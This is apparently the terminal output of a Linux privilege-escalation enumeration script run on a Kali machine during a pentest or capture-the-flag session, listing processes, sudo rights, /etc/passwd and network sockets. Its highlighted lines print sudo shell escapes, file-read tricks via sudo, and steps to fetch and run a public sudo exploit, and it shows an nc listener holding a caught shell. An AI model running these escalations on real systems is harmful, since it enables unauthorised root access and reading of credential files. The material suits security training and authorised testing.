[0;94m      ____       _                       _     _                   [0m
[0;94m     |  _ \ _ __(_)_   _____  ___  ___  | |   (_)_ __  _   ___  __ [0m
[0;94m     | |_) | '__| \ \ / / _ \/ __|/ __| | |   | | '_ \| | | \ \/ / [0m
[0;94m     |  __/| |  | |\ V /  __/\__ \ (__  | |___| | | | | |_| |>  <  [0m
[0;94m     |_|   |_|  |_| \_/ \___||___/\___| |_____|_|_| |_|\__,_/_/\_\ [0m
[0;92m                                                                   [0m
[0;92m      ____          ____                 _____                     [0m
[0;92m     | __ ) _   _  |  _ \ _ __ ___   ___|___ / ___ ___  ___  _ __  [0m
[0;92m     |  _ \| | | | | |_) | '__/ _ \ / __| |_ \/ __/ __|/ _ \| '__| [0m
[0;92m     | |_) | |_| | |  __/| | | (_) | (__ ___) \__ \__ \ (_) | |    [0m
[0;92m     |____/ \__, | |_|   |_|  \___/ \___|____/|___/___/\___/|_|    [0m
[0;92m            |___/                                                  [0m
[0;92m                                                                   [0m

[0;94m###################################################[0m
[0;94mVersion du kernel                                 #[0m
[0;94m###################################################[0m
Linux kali 5.14.0-kali4-amd64 #1 SMP Debian 5.14.16-1kali1 (2021-11-05) x86_64 GNU/Linux
Find kernel exploits in : https://github.com/lucyoa/kernel-exploits

[0;94m###################################################[0m
[0;94mProcess list                                      #[0m
[0;94m###################################################[0m
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
kali      124217  0.2  1.7 38053608 143004 ?     Sl   03:09   0:16 /usr/share/code/code --ms-enable-electron-run-as-node --inspect-port=0 /usr/share/code/resources/app/out/bootstrap-fork --type=extensionHost --skipWorkspaceStorageLock
kali      124575  0.1  0.9 38034580 80120 ?      Sl   03:10   0:08 /usr/share/code/code --ms-enable-electron-run-as-node /usr/share/code/resources/app/out/bootstrap-fork --type=ptyHost
kali      124641  0.0  0.8 38041052 72156 ?      Sl   03:10   0:01 /usr/share/code/code --ms-enable-electron-run-as-node /usr/share/code/resources/app/out/bootstrap-fork --type=watcherServiceParcelSharedProcess
kali      124657  0.0  0.0  10412  6224 pts/9    Ss+  03:10   0:00 /usr/bin/zsh
kali      124876  0.0  0.8 37990380 69600 ?      Sl   03:10   0:00 /usr/share/code/code --ms-enable-electron-run-as-node /usr/share/code/resources/app/extensions/json-language-features/server/dist/node/jsonServerMain --node-ipc --clientProcessId=124217
kali      125616  0.0  0.0   6896  3120 pts/0    S+   03:11   0:00 /bin/bash /usr/bin/pentest
kali      125629  0.1  0.0  12112  7188 ?        Ss   03:11   0:07 tmux new-session -s Pentest -d
kali      125630  0.0  0.0  15228  7800 pts/10   Ss   03:11   0:02 -zsh
kali      125639  0.0  0.0  10416  6200 pts/5    Ss   03:11   0:00 -zsh
kali      125646  0.1  0.0  10312  6164 pts/8    Ss   03:11   0:13 -zsh
kali      125661  0.0  0.0  13796  7696 pts/11   Ss   03:11   0:02 -zsh
kali      125666  0.0  0.0  13484  6944 pts/6    Ss   03:11   0:01 -zsh
kali      125669  0.0  0.0   8388  3632 pts/0    S+   03:11   0:00 tmux attach-session -t Pentest:2.2
kali      127709  8.2  1.6 2551128 135368 ?      Sl   03:15   8:55 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 13 -isForBrowser -prefsLen 8825 -prefMapSize 220538 -parentBuildID 20210901125844 -appdir /usr/lib/firefox-esr/browser 122584 true tab
kali      128688  0.0  0.0   7216   880 pts/5    S+   03:17   0:01 ping 10.10.121.56
root      139916  0.0  0.0  11120  5036 pts/10   S+   03:34   0:00 sudo openvpn petibonum.minus.ovpn
root      139917  0.0  0.0  11072  7452 pts/10   S+   03:34   0:03 openvpn petibonum.minus.ovpn
kali      141510  0.0  0.0 364480  6448 ?        Sl   03:37   0:00 /usr/lib/speech-dispatcher-modules/sd_dummy /etc/speech-dispatcher/modules/dummy.conf
kali      141513  0.0  0.0 158300  2264 ?        Ssl  03:37   0:00 /usr/bin/speech-dispatcher --spawn --communication-method unix_socket --socket-path /run/user/1000/speech-dispatcher/speechd.sock
root      144926  0.0  0.0      0     0 ?        I    03:44   0:01 [kworker/3:1-events]
kali      148625  0.0  0.0  13564  7300 pts/7    Ss   03:51   0:00 -zsh
kali      148789  0.0  0.1  14528  9120 pts/7    S+   03:51   0:00 vim priv1.txt
kali      148806  0.0  0.0  13484  6932 pts/12   Ss   03:51   0:00 -zsh
kali      148933  0.0  0.1  14524  9160 pts/12   S+   03:52   0:00 vim sudo
root      157268  0.0  0.0      0     0 ?        I    04:09   0:00 [kworker/0:0-mm_percpu_wq]
root      162719  0.0  0.0      0     0 ?        I    04:20   0:00 [kworker/u64:0-events_unbound]
kali      163393  0.3  2.8 2781676 233364 ?      Sl   04:21   0:08 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 26 -isForBrowser -prefsLen 9562 -prefMapSize 220538 -parentBuildID 20210901125844 -appdir /usr/lib/firefox-esr/browser 122584 true tab
root      172283  0.0  0.0      0     0 ?        I    04:39   0:01 [kworker/2:1-events]
kali      172851  0.0  0.0   2412  1924 pts/6    S+   04:40   0:00 nc -nvlp 4444
root      173458  0.0  0.0      0     0 ?        I    04:41   0:00 [kworker/1:2-events_freezable_power_]
root      177968  0.0  0.0      0     0 ?        I    04:50   0:00 [kworker/u64:1-events_unbound]
root      180934  0.0  0.0      0     0 ?        I    04:56   0:00 [kworker/0:2-events]
root      180935  0.0  0.0      0     0 ?        I    04:56   0:00 [kworker/3:2-events]
root      180944  0.0  0.0      0     0 ?        I    04:56   0:00 [kworker/2:2-events]
kali      180970  0.3  1.5 2431520 123652 ?      Sl   04:56   0:01 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 27 -isForBrowser -prefsLen 9718 -prefMapSize 220538 -parentBuildID 20210901125844 -appdir /usr/lib/firefox-esr/browser 122584 true tab
kali      181016  6.3  4.2 3053636 348960 ?      Sl   04:56   0:29 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 28 -isForBrowser -prefsLen 9718 -prefMapSize 220538 -parentBuildID 20210901125844 -appdir /usr/lib/firefox-esr/browser 122584 true tab
root      181131  0.0  0.0      0     0 ?        I    04:56   0:00 [kworker/1:0-ata_sff]
kali      182816  0.0  0.8 2378868 69232 ?       Sl   05:00   0:00 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 29 -isForBrowser -prefsLen 9718 -prefMapSize 220538 -parentBuildID 20210901125844 -appdir /usr/lib/firefox-esr/browser 122584 true tab
root      182896  0.0  0.0      0     0 ?        I    05:00   0:00 [kworker/u64:2]
root      183693  0.0  0.0      0     0 ?        I    05:02   0:00 [kworker/1:1-ata_sff]
root      183710  0.0  0.0      0     0 ?        I    05:02   0:00 [kworker/3:0-events]
kali      185153  0.0  0.0   5312   660 pts/8    S+   05:04   0:00 sleep 1
kali      185154  0.0  0.0   6764  3352 pts/11   S+   05:04   0:00 /bin/bash ./privesc-linux.sh
kali      185156  0.0  0.0  10020  3464 pts/11   R+   05:04   0:00 ps aux
[0;91mScreen detected : /usr/bin/screen -x <screen> (ex <screen> : root/root)'[0m

[0;94m###################################################[0m
[0;94mUser                                              #[0m
[0;94m###################################################[0m
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer)

[0;94m###################################################[0m
[0;94mSudo perms                                        #[0m
[0;94m###################################################[0m
Matching Defaults entries for kali on kali:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kali may run the following commands on kali:
    (ALL : ALL) ALL
-----------------------------------------------------------
[0;91mFor awk execute command : sudo awk 'BEGIN {system("/bin/bash")}'[0m
-----------------------------------------------------------
[0;91mFor vim execute command : sudo vim-c ':!/bin/sh'[0m
-----------------------------------------------------------
[0;91mFor perl execute command : sudo perl -e 'exec "/bin/bash";'[0m
-----------------------------------------------------------
No python binary
-----------------------------------------------------------
[0;91mFor less execute command 1 : sudo less /etc/hosts[0m
[0;91mIn /etc/hosts type : !bash[0m
-----------------------------------------------------------
[0;91mFor man execute command 1 : sudo man man[0m
[0;91mType : !bash[0m
-----------------------------------------------------------
[0;91mFor vi execute command 1 : sudo vi[0m
[0;91mType : !bash[0m
-----------------------------------------------------------
[0;91mFor apache2 execute command : sudo apache2 -f /etc/shadow[0m
-----------------------------------------------------------
[0;91mFor chroot execute command : sudo chroot /[0m
-----------------------------------------------------------
[0;91mFor find execute command : sudo find . -exec /bin/sh \; -quit[0m
-----------------------------------------------------------
[0;91mFor gcc execute command : sudo gcc -wrapper /bin/sh,-s .[0m
-----------------------------------------------------------
No ansible binary
-----------------------------------------------------------
[0;91mFor apt-get execute command 1 : sudo apt-get changelog apt[0m
[0;91mFor apt-get execute command 2 : !/bin/sh[0m
[0;91mIf last comman don't work, execute command 1 : TF=$(mktemp)[0m
[0;91mIf last comman don't work, execute command 2 : echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF[0m
[0;91mIf last comman don't work, execute command 3 : sudo apt-get install -c $TF sl[0m
[0;91mOther technique, execute command : sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh[0m
-----------------------------------------------------------
[0;91mFor apt execute command 1 : sudo apt changelog apt[0m
[0;91mFor apt execute command 2 : !/bin/sh[0m
[0;91mIf last comman don't work, execute command 1 : TF=$(mktemp)
[0;91mIf last comman don't work, execute command 2 : echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF[0m
[0;91mIf last comman don't work, execute command 3 : sudo apt install -c $TF sl[0m
[0;91mOther technique, execute command : sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh[0m
-----------------------------------------------------------
[0;91mFor ar execute command 1 : TF=$(mktemp -u)[0m
[0;91mFor ar execute command 2 : LFILE=<file_to_read>[0m
[0;91mFor ar execute command 3 : sudo ar r "$TF" "$LFILE"[0m
[0;91mFor ar execute command 4 : cat "$TF"[0m
-----------------------------------------------------------
No aria2c binary
-----------------------------------------------------------
[0;91mFor arj execute command 1 : TF=$(mktemp -d)[0m
[0;91mFor arj execute command 2 : LFILE=<file_to_write>[0m
[0;91mFor arj execute command 3 : LDIR=<where_to_write>[0m
[0;91mFor arj execute command 4 : echo DATA > "$TF/$LFILE"[0m
[0;91mFor arj execute command 5 : arj a "$TF/a" "$TF/$LFILE"[0m
[0;91mFor arj execute command 6 : sudo arj e "$TF/a" $LDIR[0m
-----------------------------------------------------------
[0;91mFor arp execute command 1 : LFILE=<file_to_read>[0m
[0;91mFor arp execute command 2 : sudo arp -v -f "$LFILE"[0m
-----------------------------------------------------------
[0;91mFor as execute command 1 : LFILE=<file_to_read>[0m
[0;91mFor as execute command 2 : sudo as @$LFILE[0m
-----------------------------------------------------------
No ash binary
-----------------------------------------------------------
No at binary
-----------------------------------------------------------
[0;91mFor atobm execute command 1 : LFILE=<file_to_read>[0m
[0;91mFor atobm execute command 2 : sudo atobm $LFILE 2>&1 | awk -F "'" '{print "%s", $2}'[0m
-----------------------------------------------------------
[0;91mFor base32 execute command 1 : LFILE=<file_to_read>[0m
[0;91mFor base32 execute command 2 : sudo base32 "$LFILE" | base32 --decode[0m
-----------------------------------------------------------
[0;91mFor base64 execute command 1 : LFILE=<file_to_read>[0m
[0;91mFor base64 execute command 2 : sudo base64 "$LFILE" | base64 --decode[0m
-----------------------------------------------------------
[0;91mFor basenc execute command 1 : LFILE=<file_to_read>[0m
[0;91mFor basenc execute command 2 : sudo basenc --base64  | basenc -d --base64[0m
-----------------------------------------------------------
No bash binary
-----------------------------------------------------------

[0;94m###################################################[0m
[0;94mSudo version                                      #[0m
[0;94m###################################################[0m
Sudo version 1.9.5p2
[0;91mCreate file with this code inside : https://github.com/saleemrashid/sudo-cve-2019-18634/blob/master/exploit.c[0m
[0;91mCompile : gcc exploit.c -o exploit[0m
[0;91mExecute : ./exploit[0m

[0;94m###################################################[0m
[0;94m/etc/passwd                                       #[0m
[0;94m###################################################[0m
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:103:110:MySQL Server,,,:/nonexistent:/bin/false
tss:x:104:111:TPM software stack,,,:/var/lib/tpm:/bin/false
strongswan:x:105:65534::/var/lib/strongswan:/usr/sbin/nologin
systemd-timesync:x:106:112:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
redsocks:x:107:113::/var/run/redsocks:/usr/sbin/nologin
rwhod:x:108:65534::/var/spool/rwho:/usr/sbin/nologin
iodine:x:109:65534::/run/iodine:/usr/sbin/nologin
messagebus:x:110:114::/nonexistent:/usr/sbin/nologin
miredo:x:111:65534::/var/run/miredo:/usr/sbin/nologin
_rpc:x:112:65534::/run/rpcbind:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
tcpdump:x:114:120::/nonexistent:/usr/sbin/nologin
rtkit:x:115:121:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:116:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:117:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
statd:x:118:65534::/var/lib/nfs:/usr/sbin/nologin
avahi:x:119:125:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
stunnel4:x:120:126::/var/run/stunnel4:/usr/sbin/nologin
Debian-snmp:x:121:127::/var/lib/snmp:/bin/false
speech-dispatcher:x:122:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
sslh:x:123:128::/nonexistent:/usr/sbin/nologin
postgres:x:124:129:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
nm-openvpn:x:125:130:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
nm-openconnect:x:126:131:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin
pulse:x:127:132:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:128:135::/var/lib/saned:/usr/sbin/nologin
inetsim:x:129:137::/var/lib/inetsim:/usr/sbin/nologin
lightdm:x:130:138:Light Display Manager:/var/lib/lightdm:/bin/false
colord:x:131:139:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:132:140::/var/lib/geoclue:/usr/sbin/nologin
king-phisher:x:133:141::/var/lib/king-phisher:/usr/sbin/nologin
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin

[0;94m###################################################[0m
[0;94m/etc/shadow                                       #[0m
[0;94m###################################################[0m
[0;91m[0m

[0;94m###################################################[0m
[0;94mBash_history                                      #[0m
[0;94m###################################################[0m


[0;94m###################################################[0m
[0;94mIP                                                #[0m
[0;94m###################################################[0m
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:c5:0f:d0 brd ff:ff:ff:ff:ff:ff
    inet 172.16.204.33/24 brd 172.16.204.255 scope global dynamic noprefixroute eth0
       valid_lft 21856sec preferred_lft 21856sec
    inet6 fe80::20c:29ff:fec5:fd0/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
23: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none 
    inet 10.8.254.74/16 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::bddc:35b3:b3d4:31fb/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever

[0;94m###################################################[0m
[0;94mARP discover                                      #[0m
[0;94m###################################################[0m
? (172.16.204.254) at 00:ff:18:a9:70:5e [ether] on eth0

[0;94m###################################################[0m
[0;94mOpen ports                                        #[0m
[0;94m###################################################[0m
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 172.16.204.33:55430     104.22.55.228:443       ESTABLISHED keepalive (381.98/0/0)
tcp        0      0 172.16.204.33:50124     13.69.68.64:443         ESTABLISHED keepalive (0.28/0/0)
tcp        0      0 172.16.204.33:52806     216.58.201.227:80       TIME_WAIT   timewait (24.89/0/0)
tcp        0      0 172.16.204.33:41018     140.82.121.4:443        TIME_WAIT   timewait (11.24/0/0)
tcp        0      0 172.16.204.33:42228     185.70.42.42:443        ESTABLISHED off (0.00/0/0)
tcp        0      0 172.16.204.33:37448     142.250.178.142:443     ESTABLISHED off (0.00/0/0)
tcp        0      0 172.16.204.33:37710     44.233.180.72:443       ESTABLISHED keepalive (299.56/0/0)
tcp        0      0 172.16.204.33:55560     185.70.42.29:443        TIME_WAIT   timewait (9.94/0/0)
tcp        0      0 172.16.204.33:41020     140.82.121.4:443        TIME_WAIT   timewait (13.04/0/0)
tcp        0      0 10.8.254.74:4444        10.10.121.56:57914      ESTABLISHED off (0.00/0/0)
udp        0      0 172.16.204.33:68        172.16.204.254:67       ESTABLISHED off (0.00/0/0)
udp        0      0 0.0.0.0:45505           0.0.0.0:*                           off (0.00/0/0)
raw        0      0 0.0.0.0:1               0.0.0.0:*               7           off (0.00/0/0)
raw6       0      0 :::58                   :::*                    7           off (0.00/0/0)
raw6       0      0 :::58                   :::*                    7           off (0.00/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     STREAM     LISTENING     17874    /tmp/ssh-XXXXXXBrxHnp/agent.809
unix  2      [ ACC ]     STREAM     LISTENING     19474    /tmp/dbus-VtoGV3BGue
unix  3      [ ]         DGRAM                    10107    /run/systemd/notify
unix  2      [ ACC ]     STREAM     LISTENING     10110    /run/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     10112    /run/systemd/userdb/io.systemd.DynamicUser
unix  2      [ ACC ]     STREAM     LISTENING     10113    /run/systemd/io.system.ManagedOOM
unix  2      [ ]         DGRAM                    10122    /run/systemd/journal/syslog
unix  2      [ ACC ]     STREAM     LISTENING     10124    /run/systemd/fsck.progress
unix  17     [ ]         DGRAM                    10128    /run/systemd/journal/dev-log
unix  7      [ ]         DGRAM                    10130    /run/systemd/journal/socket
unix  2      [ ACC ]     STREAM     LISTENING     1681     @/tmp/.X11-unix/X0
unix  2      [ ACC ]     STREAM     LISTENING     10132    /run/systemd/journal/stdout
unix  2      [ ACC ]     SEQPACKET  LISTENING     10134    /run/udev/control
unix  2      [ ]         DGRAM                    1958     /run/user/1000/systemd/notify
unix  2      [ ACC ]     STREAM     LISTENING     1961     /run/user/1000/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     1966     /run/user/1000/bus
unix  2      [ ACC ]     STREAM     LISTENING     1968     /run/user/1000/gnupg/S.dirmngr
unix  2      [ ACC ]     STREAM     LISTENING     1970     /run/user/1000/gnupg/S.gpg-agent.browser
unix  2      [ ACC ]     STREAM     LISTENING     1972     /run/user/1000/gnupg/S.gpg-agent.extra
unix  2      [ ACC ]     STREAM     LISTENING     1974     /run/user/1000/gnupg/S.gpg-agent.ssh
unix  2      [ ACC ]     STREAM     LISTENING     1976     /run/user/1000/gnupg/S.gpg-agent
unix  2      [ ACC ]     STREAM     LISTENING     1978     /run/user/1000/pipewire-0
unix  2      [ ACC ]     STREAM     LISTENING     1980     /run/user/1000/pulse/native
unix  2      [ ACC ]     STREAM     LISTENING     1437     /run/systemd/journal/io.systemd.journal
unix  2      [ ACC ]     STREAM     LISTENING     19481    @/tmp/.ICE-unix/809
unix  2      [ ACC ]     STREAM     LISTENING     69795    /run/user/1000/keyring/control
unix  2      [ ACC ]     STREAM     LISTENING     636051   /run/user/1000/vscode-f2138f4e-1.63.1-main.sock
unix  2      [ ACC ]     STREAM     LISTENING     639034   /run/user/1000/vscode-git-f8319f6145.sock
unix  2      [ ACC ]     STREAM     LISTENING     773000   /run/user/1000/speech-dispatcher/speechd.sock
unix  2      [ ACC ]     STREAM     LISTENING     1682     /tmp/.X11-unix/X0
unix  2      [ ACC ]     STREAM     LISTENING     19482    /tmp/.ICE-unix/809
unix  3      [ ]         SEQPACKET  CONNECTED     634605   @00017
unix  2      [ ACC ]     STREAM     LISTENING     645310   /tmp/tmux-1000/default
unix  2      [ ACC ]     STREAM     LISTENING     14180    /run/dbus/system_bus_socket
unix  3      [ ]         SEQPACKET  CONNECTED     634607   @00018
unix  3      [ ]         SEQPACKET  CONNECTED     634606   
unix  3      [ ]         STREAM     CONNECTED     19845    
unix  3      [ ]         STREAM     CONNECTED     19844    
unix  3      [ ]         STREAM     CONNECTED     631264   
unix  3      [ ]         STREAM     CONNECTED     625129   
unix  3      [ ]         STREAM     CONNECTED     621024   @/tmp/.X11-unix/X0
unix  3      [ ]         STREAM     CONNECTED     1002875  
unix  3      [ ]         STREAM     CONNECTED     1002848  
unix  3      [ ]         STREAM     CONNECTED     904377   
unix  3      [ ]         STREAM     CONNECTED     636064   
unix  3      [ ]         STREAM     CONNECTED     19867    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     19109    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     656985   
unix  3      [ ]         STREAM     CONNECTED     18273    
unix  3      [ ]         STREAM     CONNECTED     18128    
unix  3      [ ]         STREAM     CONNECTED     526780   
unix  3      [ ]         STREAM     CONNECTED     17410    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     638007   
unix  3      [ ]         STREAM     CONNECTED     633736   
unix  3      [ ]         SEQPACKET  CONNECTED     621027   
unix  3      [ ]         STREAM     CONNECTED     18980    @/tmp/.ICE-unix/809
unix  3      [ ]         STREAM     CONNECTED     18125    @/tmp/.X11-unix/X0
unix  3      [ ]         STREAM     CONNECTED     17155    /run/user/1000/bus
unix  3      [ ]         STREAM     CONNECTED     17978    @/tmp/.X11-unix/X0
unix  3      [ ]         STREAM     CONNECTED     19815    
unix  3      [ ]         STREAM     CONNECTED     19694    
unix  3      [ ]         STREAM     CONNECTED     1013968  
unix  3      [ ]         STREAM     CONNECTED     636202   
unix  3      [ ]         STREAM     CONNECTED     18775    /tmp/dbus-VtoGV3BGue
unix  3      [ ]         STREAM     CONNECTED     904392   
unix  3      [ ]         STREAM     CONNECTED     18777    
unix  3      [ ]         STREAM     CONNECTED     790459   
unix  3      [ ]         STREAM     CONNECTED     646161   /tmp/tmux-1000/default
unix  3      [ ]         STREAM     CONNECTED     16336    
unix  3      [ ]         STREAM     CONNECTED     641068   
unix  3      [ ]         STREAM     CONNECTED     18758    /tmp/dbus-VtoGV3BGue
unix  3      [ ]         STREAM     CONNECTED     19536    /run/user/1000/bus
unix  2      [ ]         DGRAM                    17887    
unix  3      [ ]         DGRAM                    10108    
unix  3      [ ]         STREAM     CONNECTED     18782    @/tmp/.ICE-unix/809
unix  3      [ ]         STREAM     CONNECTED     634741   
unix  3      [ ]         STREAM     CONNECTED     19140    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     1002838  
unix  2      [ ]         STREAM     CONNECTED     906436   
unix  3      [ ]         STREAM     CONNECTED     636220   
unix  3      [ ]         STREAM     CONNECTED     17397    
unix  3      [ ]         STREAM     CONNECTED     17360    /run/user/1000/bus
unix  3      [ ]         SEQPACKET  CONNECTED     1013973  
unix  3      [ ]         STREAM     CONNECTED     636364   
unix  3      [ ]         STREAM     CONNECTED     631263   
unix  3      [ ]         STREAM     CONNECTED     631141   
unix  3      [ ]         STREAM     CONNECTED     19129    
unix  3      [ ]         STREAM     CONNECTED     18089    @/tmp/.X11-unix/X0
unix  3      [ ]         STREAM     CONNECTED     18756    @/tmp/.X11-unix/X0
unix  3      [ ]         STREAM     CONNECTED     18704    
unix  2      [ ]         SEQPACKET  CONNECTED     901431   
unix  3      [ ]         STREAM     CONNECTED     641067   
unix  3      [ ]         STREAM     CONNECTED     622930   
unix  3      [ ]         STREAM     CONNECTED     18164    
unix  3      [ ]         STREAM     CONNECTED     633737   
unix  2      [ ]         SEQPACKET  CONNECTED     630880   
unix  2      [ ]         DGRAM                    18957    
unix  3      [ ]         STREAM     CONNECTED     17278    /run/user/1000/bus
unix  3      [ ]         STREAM     CONNECTED     17194    
unix  3      [ ]         STREAM     CONNECTED     17124    
unix  3      [ ]         STREAM     CONNECTED     17090    
unix  3      [ ]         STREAM     CONNECTED     1685     /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     16090    /run/dbus/system_bus_socket
unix  3      [ ]         DGRAM                    14107    
unix  2      [ ]         DGRAM                    115229   
unix  3      [ ]         STREAM     CONNECTED     18086    
unix  2      [ ]         DGRAM                    332453   
unix  3      [ ]         STREAM     CONNECTED     19811    
unix  3      [ ]         STREAM     CONNECTED     18889    @/tmp/.X11-unix/X0
unix  3      [ ]         STREAM     CONNECTED     658445   
unix  3      [ ]         STREAM     CONNECTED     18748    
unix  3      [ ]         STREAM     CONNECTED     641070   
unix  3      [ ]         STREAM     CONNECTED     19555    /run/user/1000/bus
unix  3      [ ]         STREAM     CONNECTED     17910    
unix  3      [ ]         STREAM     CONNECTED     2036     
unix  3      [ ]         STREAM     CONNECTED     18655    /run/user/1000/bus
unix  2      [ ]         DGRAM                    1904     
unix  3      [ ]         DGRAM                    10109    
unix  3      [ ]         STREAM     CONNECTED     16525    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     15974    
unix  3      [ ]         STREAM     CONNECTED     1013974  
unix  3      [ ]         STREAM     CONNECTED     636333   
unix  3      [ ]         STREAM     CONNECTED     631251   
unix  3      [ ]         STREAM     CONNECTED     19221    
unix  3      [ ]         STREAM     CONNECTED     1002874  
unix  3      [ ]         STREAM     CONNECTED     1002836  
unix  3      [ ]         STREAM     CONNECTED     656987   
unix  3      [ ]         STREAM     CONNECTED     633720   /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     20545    
unix  3      [ ]         STREAM     CONNECTED     623720   
unix  3      [ ]         STREAM     CONNECTED     19585    /run/user/1000/bus
unix  2      [ ]         SEQPACKET  CONNECTED     623249   
unix  3      [ ]         STREAM     CONNECTED     19130    /run/dbus/system_bus_socket
